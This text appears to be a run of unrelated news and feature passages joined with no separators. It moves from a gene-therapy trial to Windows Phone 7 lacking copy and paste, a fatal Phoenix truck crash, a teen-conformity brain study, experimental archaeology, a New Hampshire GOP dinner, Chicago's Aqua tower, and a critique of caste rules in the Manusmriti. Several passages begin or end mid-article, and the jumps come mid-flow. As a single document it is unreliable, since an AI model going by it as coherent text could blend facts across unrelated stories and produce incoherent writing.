After fishing stem cells from each individual ’s own blood , the researchers inserted a normal version of the ABCD1 gene into some of the cells and transplanted them back into the kids .
The results were promising : ALD progression halted within 14 to 16 months .
A year later neither child had further brain damage or leukemia ( a side effect in some past gene therapy trials ) .
The researchers have now treated a third individual and are preparing for larger trials in Europe and the U.S .
Ready for another long , drawn - out copy and paste controversy to overtake your every waking moment for a year or two ?
Good : Microsoft just mentioned in a Q&A session here at MIX10 in no uncertain terms that clipboard operations wo n't be supported on Windows Phone 7 Series ... so that 's that .
Kind of ironic considering that the WinMo of old has been enjoying the functionality since time immemorial , is n't it ?
Of course , anything is possible going forward -- they 've said on several occasions in different talks and sessions this week that they 're already looking at a number of enhancements that were scoped out of the initial release of the platform -- but for the phones you buy this holiday season , do n't expect to be copying anything between apps .
Update :
We just super - double - ultra - plus - confirmed this with Microsoft -- Windows Phone 7 Series will not have copy and paste functionality .
There is a data - detection service built into the text - handling API that will recognize phone numbers and addresses , but Microsoft says most users , including Office users , do n't really need clipboard functionality .
We ... respectfully disagree ?
Sure , let 's leave it at that .
At least three people died after a dump truck slammed into a group of motorcycles at 27th Drive and Carefree Highway in north Phoenix .
Video from motorcycle crash scene | Photos
Eight motorcycles carrying at least nine people were stopped at a stop light when the large truck apparently hit them from behind , Phoenix police spokesman Luis Samudio said .
Three bodies were pinned under the truck .
Tania Krukoff , an employee at a nearby Walgreen 's , said she was returning from a nearby gas station when she came upon the accident and talked to the driver of the truck .
" He was in shock , " Krukoff said .
" He ( said ) he was n't paying attention , just shuffling with his paperwork . "
Six people more were taken to local hospitals , one of them being a Phoenix fire captain , Samudio said .
The firefighter , Ernie Lizarraga , is a 22 - year veteran of the department , officials said .
He was taken into surgery .
Lizarraga is a member of a motorcycle club called Phoenix - M- C - Kruzers .
Authorities have not yet confirmed whether the riders hurt Thursday were with the club ; however , an invitation for Thursday 's ride posted by Lizarraga on the Web site , meetup.com , told riders they would go to Carefree " and off to Bartlett Lake . "
" I just WANNA RIDE , " he told members of the Web group .
After the accident the Blue Sky Sanitation truck was smoking , and popping could be heard before it burst into flames .
Witnesses saved at least two people who were near the truck when it caught fire by pulling them to safety .
Motorcycles were said to be spread out 20 to 30 yards behind the truck .
A medical helicopter landed at least twice to transfer victims to the hospital .
After the truck hit the motorcycles , the truck burst into flames and hit a sports - utility vehicle , a pickup and a sedan .
No one from any of those vehicles was injured , Daisy Mountain Fire Department spokesman Phil Dyer said .
The driver of the truck was not injured .
Officials said there were no initial signs of impairment .
The Carefree Highway was expected to be closed for several hours .
Lynn McDowell , also a Walgreen 's employee , ran out with other employees to help .
" I grabbed all the water I could and took blankets because there were bodies everywhere , " McDowell said .
" It was horrible . "
The truck driver , she said , " got out of the truck and tried to help the people under the truck . ''
" The flames were so high you could n't get close , " she reported .
She and others took fire extinguishers from Walgreen 's to try to extinguish the flames .
Jarrod Cook owns Ketzal Mexican Grill near the scene .
He said he has closed his shop for the day because of the accident .
All six that was transported are in critical condition .
At least 50 firefighters and two ladder crews responded to the scene .
Transportation officials said the road would reopen by 7 a.m. Friday .
In 2009 , Miley Cyrus reportedly made an astonishing 25 million dollars .
Most of that money came from album sales , which were reported to be slightly over 4 million during that year .
Four million … Four million ?!
Have you heard Miley Cyrus sing ?
Are there really four million kids out there willing to spend their hard - earned babysitting money on a Miley Cyrus album because they deeply love listening to her sing ?
Well , according to the findings of a study recently published in Neuroimage , selling four million albums does not translate to having four million people like your music .
The study reports that there is good reason to believe that a lot of those purchases were made out of fear -- a fear well known to adolescents all over America : terror of social rejection .
The fear of social rejection is so strong in adolescents because their relationships are essential for passing on the lessons that will enable them to join adult society .
In order to do this properly and efficiently , teenagers come equipped with the ability to learn fast and furiously from their peers , especially those who wield more social power -- who are older or more popular .
Although this system developed because it helps the teen transition to adulthood , it has proven an excellent principle upon which to base economic decisions .
The popular kids dictate teen culture , and if they endorse it ( Twilight , anyone ? ) it will sell .
Gregory S. Berns , the chair of Neuroeconomics at Emory University , and his colleagues set out to understand more about the neural and behavioral mechanics of social influence on decisions about purchasing music .
The researchers ’ basic question was :
When people change their behavior based on social influence , is it their actual preferences that change , or simply their behavior ?
In order to investigate this question they designed a clever behavioral study that was amenable to being performed while participants had their brains scanned .
The researchers chose to study adolescents between the ages of 12 and 17 , a cohort thought to be highly susceptible to social influence , and known to buy at least one third of albums in the United States .
Each participant heard a short clip of a song downloaded from the social - networking website Myspace .
Following the clip they were asked to make two ratings , one indicating how familiar they were with the clip ( which was always the hook or chorus of the chosen song ) and one indicating how much they liked the clip on a five point scale .
The clip was then played a second time , and they were again asked to rate how much they liked the song .
However , in two thirds of these second trials the teens were shown a popularity rating that was estimated based on the number of times the song was downloaded .
When no information about the popularity of a song was displayed , teens changed their likability rating of the song 12 percent of the time .
Not surprisingly , after being shown the popularity of a song , teens changed their ratings more frequently , on average 22 percent of the time .
This difference was highly significant , and it is worth noting that among those who changed their likability ratings , 79 percent of the time teens changed their ratings in the direction of the popularity rating -- they followed the crowd .
These behavioral findings validate a great deal of previous research on conformity , and demonstrate that it is alive and well in the average American adolescent .
Although these results are compelling , they do not address whether or not teens were actually “ following the crowd ” or , upon further reflection and information from their peers , changed their intrinsic preference for a particular piece of music .
To investigate this question , Berns and his colleagues looked to brain activity .
Their logic was simple :
Using the first rating of the songs , it would be possible to find a network of brain regions that related to individuals ’ reports of liking the music .
If , after they changed their minds in the second rating , this network appeared again , then it would suggest that the adolescents really did change how much they liked the music based on the influence of their peers .
If , on the other hand , a different network of regions revealed itself following a change in likability rating , this would be more in line with the notion that teens were simply complying with their peers .
Liking of songs , based on teens ’ initial ratings was strongly related to activity in the head of the caudate nucleus .
Although the exact nature of caudate activity remains a source of debate , most agree that activity in this area is highly related to reward and valuation .
So it appears to reflect pleasure , not familiarity .
The researchers also observed activity in a number of regions that have been previously associated with the pleasurable aspects of listening to music .
When adolescents changed their ratings , according to their brain activity , it had nothing to do with increased liking of the music .
Instead , a very different picture emerged .
The network of regions associated with changing a rating included bilateral insula , the anterior cingulate cortex and the supplementary motor cortex and frontal poles -- regions previously associated with anxiety and pain .
These regions all showed increased activity when teens were shown a popularity rating that did not match their own , meaning that they had this neural response prior to changing their own rating .
Interestingly , individuals who demonstrated the greatest sensitivity to popularity , as determined by survey measures taken at the beginning of the study , manifested the strongest insula activity during the act of conforming .
Simply , the greater the insula activity , the higher the odds of conforming .
The authors suggest that this pattern of activity can be explained by cognitive or emotional dissonance caused by the mismatch between one ’s ratings and the ratings of others .
So , the authors argue , conforming seems to be motivated not by the positive utility of behaving like your peers , but instead out of anxiety and pain at the prospect of being a “ contrarian . ”
Again , this points to the function of peer influence during adolescence .
During adolescence , peers wield considerable coercive power -- that is , friends are quick to dispense disapproval , teasing and rejection when social norms are not followed .
The pain of being rejected by one ’s peer group can be a matter of life or death , as recent cyber - bullying cases in the news demonstrate .
So what does this study mean practically ?
Well , there are very different implications for commerce and parents .
In terms of marketing , if you want to sell a lot of albums , get the popular kids hooked , and their endorsement will cause enough fear among their overly attentive peers to make the music sell .
The idea of being able to relate to another teen for only $ 12.95 is very appealing to adolescents , who are consumed with trying to maintain their status in their peer groups .
For parents the implications are a little different .
Take heart from these findings .
It is likely the case that your teenagers do not actually like the terrible music you hear during those brief moments when they take their ear buds out .
In fact , the researchers found that adolescents who were most sensitive to the ratings of others engaged in much less active listening ( which is particularly encouraging given the lyrics of some popular music ) .
The bottom line for parents is that if your adolescents ’ need for the latest Hannah Montana album keeps them in step with their peer group , take it as a sign that they are aware of their culture -- and this type of conformity is often predictive of a teen eventually becoming a well - adjusted adult .
For some people , studying the past is n't enough .
They recreate millennia - old tools , boats , and even towns to better understand how ancient peoples lived .
They are called experimental archaeologists , and these are ten of their greatest triumphs .

Experimental archaeology has been practiced for several decades , although it has only been accepted as a serious subfield of archaeology relatively recently .
That 's partially because it attracts a lot of amateur enthusiasts who are eager to contribute , even if the scientific applicability of their work is often debatable .
In a sense , experimental archaeology is an attempt to reverse engineer the past , not so much to deduce exactly how things worked but to better understand how ancient peoples interacted with their environments and technologies .
What follows is a video gallery of a number of different archaeological experiments both professional and amateur in nature that run the gamut of what the field can do .
The Kon-Tiki Expedition
Although most works of experimental archaeology have focused on Northern Europe , what really put the field on the map was the 1947 voyage of Kon-Tiki from Peru to Tahiti .
Led by Norwegian explorer and amateur anthropologist Thor Heyerdahl , the voyage was meant to prove indigenous groups from South America could have settled the Pacific long before the European age of exploration .
His five - man crew used descriptions from Spanish conquistadors to build what they saw as an authentic South American sailing vessel , which they then successfully navigated over 3,000 miles into the Pacific .
The 1951 documentary of their exploits , also called Kon-Tiki , won an Academy Award and is up above .

Butser Ancient Farm
It can be tricky separating which " working villages " are just historical reenactments ( not that there 's anything wrong with that ) and which are actually ongoing archaeological projects .
Butser Ancient Farm , located in Hampshire , England , is one of the clearest examples of the latter .
The farm is meant to recreate a British Iron Age farming community as it existed prior to Roman conquest and cultural assimilation , in particular the period between 400 BCE and 400 CE .
The farm is open to the public , but its primary purpose remains as a testing ground for various archaeological theories about agriculture , ancient technology , and animal breeding .
In an interview from the 1970s , founder and professional archaeologist Peter J. Reynolds lays out what Butser Ancient Farm is all about .
It can be found here .
The Voyages of Hokulea
Maybe the most successful experimental voyage ever undertaken was the 1976 sailing of the reconstructed Polynesian canoe Hokulea from Hawaii to Tahiti .
Organized by University of Hawaii anthropologist Ben Finney , Hokulea was primarily crewed by Native Hawaiians and sailed under the command of Micronesian navigator Mau Paialug , one of the few Pacific Islanders still knowledgeable in ancient navigational techniques .
The voyage was undertaken in part to refute the then popular notion that ancient Polynesians lacked the maritime prowess necessary to intentionally colonize the Pacific , and so such settlements were really just the result of uncontrolled " drifting " from one island to another .
Hokulea not only restored the navigational abilities of ancient sailors in Pacific archaeology , it also became a key part of the Polynesian cultural revival that continues today .
In a 2007 interview , navigator and researcher Nainoa Thompson discusses the ongoing significance of Hokulea .
Building Stonehenge In The Backyard
Amateur experimenters might not be archaeologists , but generally they bring some sort of expertise to their projects .
Take retired construction worker Wally Wallington of Flint , Michigan , who has come up with ways to easily move objects around that weigh well over a ton .
Although his experiments are just limited to moving heavy stones around his backyard , he argues that these demonstrations offer the best clues yet to understanding how ancient Britons dragged stones from their sources several miles away to build Stonehenge .
Prehistoric Iron Smelting
Experimental archaeology is n't just about recreating ancient buildings and boats ; it can also more generally deal with rediscovering the mechanics of ancient technology .
The video up top is part of a series on " Practical Archaeology " , which claims that particular adjective but it focuses on revealing and teaching ancient arts and practices to modern communities .
An argument that proponents of experimental archaeology have made throughout its history is that it allows archaeologists and amateurs alike to engage with the past from the perspective of those who lived it instead of those studying it centuries or even millennia later .
Saxonhouse
Located in Lincoln , England , Saxonhouse combines a lot of aspects of other projects we 've already considered .
Like Butser Ancient Farm , it 's an effort to recreate a settlement from a period before the advent of widespread written history , in this case 500 - 1000 CE .
It 's very much conceived as a community project that has relied on expert craftsmen to realize , but has also drawn on the input of professional archaeologists .
In this interview , co-builders Steve and Judith Jones explain that , as much as they worked from academic theories , they allowed the practicalities of the project to guide how the building took shape .
For instance , they more focused on using ancient tools to build a house strong enough to survive all year than one that looked exactly like archaeological conceptions , arguing this would reveal just as much about ancient building processes .
Building A Ballista
The popular media has also gotten in on the fun of experimental archaeology , although one has to keep in mind these are more works of entertainment than of strict science .
The 2007 BBC series Building the Impossible teamed up a professor of engineering and a materials scientist to recreate an ancient Roman ballista , a feat that had not been accomplished in some two thousand years .
In approaching the project from such an explicit engineering perspective , the series offers an opportunity to reconstruct what ancient Roman builders were thinking as they perfected this weapon of war .
Indeed , the professor notes at the outset of the program that the project basically requires them to work through two centuries worth of Roman engineers ' trial and error in two months .
The first part of the documentary is up top ; click through on the video for the rest .
Nova Tackles The Chinese Bridge
Although experimental archaeology does remain , for various reasons , a mostly European endeavor ( and a largely British and Scandinavian one at that ) , it is hardly the exclusive domain of the West .
For instance , this episode of the Nova series Secrets of Lost Empires follows a Chinese professor as he attempts to rebuild an arch bridge using only methods and technologies available only to his ancient counterparts .
The Iceman 's Fire Kit
Make no mistake - this guy puts the " enthusiast " in amateur enthusiast .
But if you can get past the awesomely ridiculous opening ( not to mention the pants ) , you 'll find a guy who knows his stuff .
He discusses Otzi the Iceman , the 5000 - year - old mummy discovered in the early nineties in the Alps between Italy and Switzerland .
He then discusses the pouch that he carried around with him and the tools that he used to make fire in the frozen mountains , which then leads into a practical demonstration .
What 's great about this video is it really shows how experimental archaeology is a way for any person to not just take part in science , but to actually be genuinely knowledgeable and have the chance to make meaningful contributions to the field .
And hey , if that person wants to dub in some crazily melodramatic music over his attempts to light a fire using ancient methods ... well , who are we to stop him ?
Open Air Museums
Archaeology is n't just about studying the past ; it 's also about displaying it .
That 's the central thesis of this video by the Italian museum Museo Civico Archeologico Etnologico .
They argue that keeping the past in display cases robs people of the ability to truly interact with the past , to actually understand what living hundreds or thousands of years ago was like .
As the video explains , archaeological inquiry is the central focus of these " open air museums " , which house the past in settings meant to evoke and depict ancient communities .
But the focus is also on incorporating the public into the past , making them experimenters alongside their professional archaeologist peers .
Above all , the video sums up the central tenet of experimental archaeology in its discussion of ancient tools and other artifacts : " It is not enough to know what they look like .
It is vital to know how they made and used . "
ROCHESTER —
Feelings of confidence flowed out from a GOP gathering in the Lilac City Friday night , where state Sen.
Jeb Bradley urged concerned Republicans to join in the mission to take back the government from Democrats .
The Strafford County GOP organized a Lincoln - Reagan dinner , an informal reception for candidates at the Rochester Country Club Friday night .
The room was packed with New Hampshire residents upset with how the Democratic majority has increased spending and the role of government .
Bradley capitalized on the emotions to rally more people to join the GOP cause .
" This is a job that we all have to do , " he said .
" We need to fill each and every slot in the New Hampshire House . "
Though that job is far from done , Bradley also took a moment to congratulate the more than 100 people in attendance .
He said the same event last year only drew about 20 people .
The energy was high among those in attendance , and Bradley told everyone now is the time to run with confidence .
" If you think you can't run , get the word ' ca n't ' out of your vocabulary , " he said .
One in attendance who was not ready to announce his candidacy — not yet , at least — was Republican National Committee member Sean Mahoney , of Portsmouth .
Though media reports have linked him to the race for the U.S. House of Representatives , he made no commitment Friday night .
He did say that Republicans are " fired up " right now and unified against bailouts , government growth over individual liberties and the likes of House Speaker Nancy Pelosi , D - California , and Congresswoman Carol Shea - Porter , D - Rochester , who he described as an " enabler " for policies bankrupting the country .
Kaitlyn Smith , the chair of the county GOP , called Bradley the " best cheerleader " the Republican party has right now .
She said he enhanced the energy surrounding the party and understands the issues and how to address them .
Bradley 's speech followed another that also received resounding applause .
In a short video depicting the rise of Democrat power and the shift toward discontent a year after President Barack Obama 's inauguration , Ronald Reagan was featured , saying , " Government is not the solution to our problems .
Government is the problem . "
That sentiment was echoed by both candidates and those who were there simply to support the GOP and enjoy an informal opportunity to chat with those seeking their votes .
Jim Forsythe of Strafford , a state Senate candidate , said people are becoming discouraged with increased government spending .
The sense of the GOP is that the " tides are turning " and the country will , come November , begin its turn back toward fiscal conservatism , he said .
" We have a spending problem , not a revenue problem , " he said , noting 25 percent spending increases in the last two terms .
He said , if elected , he will work to cut taxes and bring jobs back to this state .
Forsythe , before Bradley 's speech , also exhorted the importance of the state House of Representatives .
The 400 representatives are closest to the people , and as such , are those most critical to making constituents ' voices heard , he said .
" It 's going to start really with the state House , " he said .
" Tonight 's really about those guys . "
According to Smith , ticket prices and proceeds from a 50 - 50 raffle at the gathering would go to the coffers of the GOP , which will use the money for campaign purposes .
An interesting dynamic evidenced at the gathering was that the GOP is making the effort to win back seats a family affair .
Not only are brothers Fenton and Warren Groen , of Rochester , running for state Senate and House of Representatives , respectively , but Laura Jones and her son , Kyle , 18 , are both running for a House seat , as are Carol Vita and her husband , Lou , of Middleton .
" We 're helping each other out , " Laura Jones said of her campaign efforts with her son .
" We 're going to take back control of the state House . "
Jones said that sentiment was not only between her and her son , but that all Republican candidates seem to be supporting one another .
She said it is more important to support the GOP 's ideals than fighting with each other at the Primary level .
" We 're so concerned about the economy , " she said .
" We 're all here to help each other . "
Aqua — a new , eighty - two - story apartment tower in the center of Chicago — is made of the same tough , brawny materials as most skyscrapers : metal , concrete , and lots of glass .
But the architect , Jeanne Gang , a forty - five - year - old Chicagoan , has figured out a way to give it soft , silky lines , like draped fabric .
She started with a fairly conventional rectangular glass slab , then transformed it by wrapping it on all four sides with wafer - thin , curving concrete balconies , describing a different shape on each floor .
Gang turned the façade into an undulating landscape of bending , flowing concrete , as if the wind were blowing ripples across the surface of the building .
You know this tower is huge and solid , but it feels malleable , its exterior pulsing with a gentle rhythm .
Aqua ’s undulating façade is even more technically ingenious than it looks .

The building would be an achievement for any architect , but Gang , who has run her own firm since 1997 , had never designed a skyscraper before and happened into this one almost by accident .
A couple of years ago , she was seated at a dinner next to Jim Lowenberg , a developer who had built a number of mediocre condominium towers in a huge development over the old Illinois Central rail yards , known as Lakeshore East .
A prime site in the project remained , Lowenberg told her , and he envisioned doing something more ambitious there .
He liked Gang and offered her a shot .
A lot of attention — in Chicago , at least — has been given to the fact that Aqua is the tallest building in the world designed by a woman .
That ’s nice for Gang , but beside the point , and dwelling on it leads too easily to predictable interpretations of skyscrapers as symbols of male identity .
Gang ’s achievement has more to do with freeing us from such silliness .
Her building is most compelling as an example of architecture that is practical and affordable enough to please real - estate developers and stirring enough to please critics .
Not many buildings like that get made at any height , or by architects of either gender .
Furthermore , the success of Aqua is n’t just that Gang figured out a smart , low - budget way of turning an ordinary glass condo tower into something that looks exciting .
The design is anchored in common sense in two ways that are n’t immediately apparent , making the building , from a technical point of view , even more remarkable than it looks .
The balcony overhangs of the façade serve an environmental purpose , shading apartments from the hot summer sun .
More ingenious still , they protect the building from the force of wind , one of the most difficult challenges in skyscraper engineering .
The landscape of rolling hills and valleys created by the balconies effectively confuses the heavy Chicago winds , giving them no clear path .
The wind is broken up so much that the building did n’t require a device known as a “ tuned mass damper ” — a mass weighing hundreds of tons that engineers place at the top of tall buildings to stabilize them against the vibrations and sway caused by the force of wind .
And using the curves to dissipate the wind gave Gang a bonus : she was able to put balconies on every floor , all the way up .
Usually , condominiums sixty or seventy floors above the street do n’t have balconies , because it ’s just too windy up there to go outside .
When you catch your first glimpse of Aqua ’s swirling façade poking out from between its boxy neighbors , you might think it ’s a gigantic version of one of those “ blob ” buildings of the past few years , curvy forms designed largely by computer .
But Gang is n’t Greg Lynn or Hani Rashid .
She brings aesthetics and engineering together in a way that is more aligned with the tradition of Chicago ’s canonical modern architecture than the building ’s appearance suggests .
Chicago is where architects like Louis Sullivan , John Wellborn Root , Mies van der Rohe , and Skidmore , Owings & Merrill elevated pragmatic solutions to structural problems to the level of art .
And that is precisely what Gang has done , albeit with a different aesthetic .
For all its visual power , Aqua is mostly free of conceit .
In an age in which so much architectural form — even , sometimes , the best architectural form — has no real rationale beyond the fact that it is what the architect felt like doing , there is something admirable about the tower ’s lack of arbitrariness .
It reclaims the notion that thrilling and beautiful form can still emerge out of the realm of the practical .
In this sense , Gang could not be more different from Zaha Hadid , who is the most famous female architect around .
Hadid is a brilliant shaper of form , but her buildings are nothing if not arbitrary , and the combination of her fame and her flamboyant designs has insidiously led people to assume that female architects tend to favor shape - making over problem - solving .
In fact , there are plenty of women who have built successful architectural practices by selling themselves not as divas but as purveyors of reason who also happen to be able to make beautiful things .
In New York , Deborah Berke , a fifty - five - year - old architect and professor at Yale , directs a firm that has designed hotels , art galleries , academic buildings , houses , and the high - profile 48 Bond Street condominium .
( Berke ’s Web site describes her work as “ simple , not simplistic ; elegant , not extravagant ; luxurious , not lavish . ” )
In San Francisco , Cathy Simon founded a firm , SMWM — until a recent merger , it was among the largest women - owned firms in the country — that numbers the restored San Francisco Ferry Building and the San Francisco Public Library among its projects .
Marianne McKenna ( the “ M ” in the big Toronto firm KPMB ) just finished an acclaimed concert hall at the Royal Conservatory of Music , in Toronto , and has been in charge of a new downtown university campus in Montreal .
Denise Scott Brown , of the Philadelphia firm Venturi , Scott Brown & Associates , has been a dominant force in the field of planning and urban design for more than a generation .
Female architects like these share a high interest in modern design combined with a low interest in ideology .
They approach design less as an opportunity to demonstrate a set of ideas than as a way of answering a series of questions about the nature of a place , a client , or a function .
“ I like to do research about a place , about materials , and about a program , ” Gang told me .
“ The longer I can delay coming up with a form , the better .
Developers do n’t always like that , but it ’s the part I like the most . ”
In the case of Aqua , she experimented with several ideas before she settled on making a façade out of what she calls the “ built contours ” of undulating concrete balconies .
Gang worked for Rem Koolhaas in Rotterdam for two years after she got her architecture degree , at Harvard , but she considered becoming an engineer before she decided to be an architect , and she thinks primarily in terms of what is buildable .
Still , she is passionate about what her buildings look like — “ I have a preference for light structure , for things that look light , almost fragile , ” she told me — and as capable of obsessing over a single detail as Norman Foster .
But she seems determined to approach her projects without preconceived notions of what they should look like .
“ I do n’t think I could have sketched Aqua on Day One , ” she said .
When I went to Chicago to see Aqua , Gang took me through the building , but she seemed more interested in making sure I got to see two new projects that were barely larger than the biggest Aqua apartments : a community center and a video - and - film production center for Columbia College , both on the South Side .
The community center has a façade made up of several layers of different types of concrete , added unevenly one atop the other , so that the exterior looks like a gargantuan sand painting , an abstract composition in gray and beige — another instance of a powerful aesthetic statement achieved with conventional materials used in an unconventional way .
At Columbia , an arts college housed in a series of old buildings , Gang ’s center , the first entirely new structure that the college has built , is an exuberant building of concrete and glass whose interior is laid out so as to emphasize framed views from one area to another :
Gang approached the project thinking in terms of how a director might frame shots through a camera .
She also tinted some of the glass in the façade to resemble the blocks of color in a television test pattern .
That ’s the sort of idea that could be a gimmick , but Gang is good enough to pull it off .
She designs by trying to identify with the client , and coming up with something that she would n’t do for anyone else .
For an environmental center , also on the South Side , she decided to construct most of the building out of recycled material , and ended up using not only recycled steel for the exterior cladding but recycled bluejeans as an insulating material .
For a housing complex in Hyderabad , she is trying to find a way to reinterpret the traditional Indian courtyard house in high - rise form .
Gang has no interest in establishing a look that marks her buildings as hers .
Her instincts are modern , but style alone does n’t shape her work ; materials , technology , and an ongoing attempt to see from the perspective of the people who will use the buildings mean much more to her .
“ You know , a lot of architects get into fetishized objects , ” she said to me .
“ But when you can design anything you want without actually having to make it , you do wild things that ca n’t work .
And that ’s not what I want to do . ” ♦
7. Supporting untouchability is also a part of the scheme of social stratification outlined in the Manusmriti .
Manu clearly mentions that Brahmin , Kshatriya and Vaishya , collectively known as dwija and the Shudras are the four varnas .
There is no fifth varna . [ 62 ]
He explains the origin of other castes by saying that they are varna - sankara castes , that is to say , castes originating due to the intermixture of different varnas , both in anuloma ( upper varna male and lower varna female ) and pratiloma ( lower varna male and upper varna female ) manner . [ 63 ]
For example , Nishad caste is said to have originated from anuloma relationship between Brahmin male and Shudra female , [ 64 ] whereas C handala caste is said to be owing its origin to pratiloma relationship between Shudra male and Brahmin female . [ 65 ]
Manu seems to be disapproving of pratiloma relationship more than the anuloma , because he describes C handalas as the lowest of the low castes . [ 66 ]
Let us see what Manusmriti , has to say about the C handala .
The Chandala , says Manusmriti , must not ever reside inside the village .
While doing their work , they must reside outside the village , at cremation ground , on mountains or in groves .
They are not entitled to keep cows or horses , etc. , as pet animals .
They may keep dogs and donkeys .
They are to wear shrouds .
They are to eat in broken utensils .
They are to use ornaments of iron , not of gold .
They must keep moving from one place to another , not residing at the same place for a long duration . [ 67 ]
They must not move around in villages and cities in night hours .
They may enter the villages and cities in daytime , with king 's permission , wearing special symbols ( to enable identification ) , and take away unclaimed dead bodies . [ 68 ]
Moreover , how is the " religious " person to deal with the Chandala ?
He must not have any social intercourse ( marriage , interdining , etc. ) with them .
He must not talk to or even see them ! [ 69 ]
He may ask servants ( apparently Shudras ) to give them food in broken utensils . [ 70 ]
8. Granting divine and religious sanction to varna - vyavastha .
Manu gives divine and religious sanction to the varna - vyavastha by claiming divine origin for the varnas as well as for the Manusmriti and demanding unquestioning obedience of it .
So , that completes my exposition of the varna - vyavastha .
I want to emphasize in particular that my exposition does not contain any exaggeration at all .
The reader may check each and every statement by comparing with the original Manusmriti in order to satisfy himself or herself .
I cannot help if the system is so unjust and so out of tune with out existing values that even an objective exposition reads like a severe condemnation .
Nevertheless , I will now turn to my reasons for rejecting varna - vyavastha : I reject varna - vyavastha because it is irrational , unjust and undemocratic , being opposed to the democratic and human values of liberty , equality and fraternity .
Criticism of varna - vyavastha
The varna - vyavastha is opposed to the value of liberty as it denies the freedom to choose one 's occupation and marriage partner to one and all .
Everyone must join the occupation of his varna and must marry within his varna .
Similarly , it denies the freedom to study to the Shudras and woman in particular .
Even the dwija must study the Vedas before he studies anything else .
Otherwise , he becomes a Shudra . [ 71 ]
( Incidentally , according to Manusmriti , there are several ways by which a Brahmin or dwija may become a Shudra but there is no way by which a Shudra may become a Brahmin .
A Shudra must always remain a Shudra . ) [ 72 ]
What is worse , the Chandala is even denied the freedom to reside at a place of his choice or to wear clothes and ornaments of his choice .
He is not even free to keep pet animals of his choice .
The conflict between varna - vyavastha and the value of equality is more than obvious .
As I mentioned earlier , the system of graded inequality seems to be the very essence of varna - vyavastha .
It denies equal respect to all in society .
It denies equality before law .
It denies equal access to marriage partners .
It denies equal access to jobs .
The occupation of teachers and priests , for example , is reserved exclusively for Brahmins .
Finally , it also denies equal access to education and knowledge .
A Brahmin , according to Manu , must not teach the Shudra and woman even if he dies with his knowledge without imparting it to anybody . [ 73 ]
On the other hand , if anyone studies the Vedas on his own he or she will go straight to hell . [ 74 ]
In other words , cent percent reservations for dwija males in the sphere of education .
The varna - vyavastha is most unfair to the Shudras and the untouchables .
They are denied respect , knowledge , power and wealth .
They are denied access to occupations considered respectable , just as they are denied access to men and women of upper varnas for marriage .
The Shudras are virtually reduced to being slaves of the Brahmins in particular and the dwijas in general , whereas the untouchables are regarded as outcast -- beyond the pale of the society .
The women are generally treated as sexual objects and as unfit for being independent and free .
As far as fraternity is considered , we must not expect it to exist in a society , which is so unequal and unjust .
A Shudra 's waist is to be branded or his buttocks are to be cut only because he occupies the same seat as the Brahmin .
The " religious " are not to talk or even look at a Chandala .
Inter - marriage is prohibited .
Manu seems to be most eager to prevent inter-mixing of the varnas .
Thus , the Hindu social order is based on the isolation and exclusiveness of the varnas .
The Manusmriti not only outlines a totally undemocratic and unjust social system but also gives divine , religious sanction to this man-made social institution of chaturvarnya .
Some Hindus , including apparently learned " thinkers " and writers , smugly wax eloquent about Hinduism being the most tolerant and liberal religion of the world .
Is there any other religion , which sanctions slavery and untouchability ?
Is there any other religion in which only persons born in a particular caste ( Brahmin ) are entitled to become priests ?
Slavery is not peculiar to India or to Hinduism , but carrying it to the extremes of untouchability , and granting it divine and religious sanction is peculiar to Hinduism .
Similarly , some Hindus may be tolerant , just as some of them are intolerant , but Hinduism or Hindu religion is not tolerant at all , either socially or intellectually .
Manusmriti , for example , clearly says that anybody who argues critically and logically about dharmashastras ought to be ostracized . [ 75 ]
Non-believers , including freethinkers , rationalists and Buddhists , are not to be entertained respectfully as guests ; though , mercifully , they may be given food . [ 76 ]
The families of non-believers are destroyed sooner than later according to Manu . [ 77 ]
A state with a large number of Shudras and nastikas soon meets its destruction . [ 78 ]
Manusmriti is full of abusive epithets for freethinkers and non-believers .
The unorthodox ( nastikas ) are sometimes equated with the Shudras , sometimes with the Chandalas , sometimes with thieves and sometimes with lunatics ! [ 79 ]
Such is the generosity of Hindu dharma .
Apologies for varna - vyavastha
Let me now consider what the apologists of varna - vyavastha have to say in its defense .
A standard defense of varna - vyavastha is to say that it is a system of division of labor .
It is easy to grant that division of labor is essential for any complex society , but it is equally easy to see that varna - vyavastha is not a system of division of labor based on aptitude and capability .
It is a system of division of labor based on birth .
Besides , it has other associated features such as feeling of superiority and inferiority , inequality before law , denial of equal access to knowledge and prohibition against inter-marriage .
What have these features to do with the division of labor ?
Division of labor is found in all societies , but varna - vyavastha is not .
Thus , trying to justify varna - vyavastha as division of labor is a futile exercise .
Another standard defense of the varna - vyavastha is to say that the system was originally based on aptitude and capability .
Whether it was actually ever so is a subject for historical research .
Most probably , the racial theory of the origin of castes is true .
However , even if we grant for the sake of argument that the varna - vyavastha was originally based on aptitude and capability , how does it help ?
We cannot say that because the system was originally , some time in remote past , based on aptitude and capability ; therefore we ought to gladly suffer the present system based on birth .
It hardly makes any sense at all !
In any case , Manusmriti was most probably written between200 BC and 200 AD [ 80 ] and the system as outlined in it is totally based on birth .
Gautam Buddha , who lived in sixth century BC , challenged the infallibility of the Vedas as well as the varna - vyavastha .
There are several passages in Tripitaka , mainly in Digha Nikaya and Majhima Nikaya which are " directed against the claims of the Brahmans to be of different origin from the rest of humanity , born from the mouth of Brahma , having a hereditary prerogative to teach , guide and spiritually govern the rest of the society . " [ 81 ]
In Majhima Nikaya Buddha is quoted as refuting varna - vyavastha on several occasions .
According to Buddha , it is unreasonable to decide one 's place and functions in society on the basis of one 's birth in a caste .
Buddha is also quoted as insisting that in the eyes of the law all persons ought to be treated as equal , irrespective of the caste or varna in which he or she is born . [ 82 ]
Thus , it is obvious that even if the system of varna - vyavastha ever existed in its ideal form -- which is doubtful -- it had already degenerated by the time of Buddha , that is , about 2500 years back .
The most blatant defense of varna - vyavastha , however , is to say that human beings are born unequal , and , therefore , it is natural and normal for children to join the occupation of their fathers .
Surprisingly and sadly , no less a person than Gandhi defended varna - vyavastha in a similar manner .
To quote Gandhi : " I believe that every man is born in the world with certain natural tendencies .
Every person is born with certain definite limitations which he cannot overcome .
From a careful observation of those limitations the law of varna was deduced .
It establishes certain spheres of action for certain people with certain tendencies .
This avoided all unworthy competition .
Whilst recognizing limitations , the law of varna admitted of no distinction of high and low ; on the one hand it guaranteed to each the fruits of his labors and on the other it prevented him from pressing upon his neighbor .
This great law has been degraded and fallen into disrepute .
But my conviction is that an ideal social order will only be evolved when the implications of this law are fully understood and given effect to " . [ 83 ]
Again , " I regard Varnashrama as a healthy division of work based on birth .
The present ideas of caste are a perversion of the original .
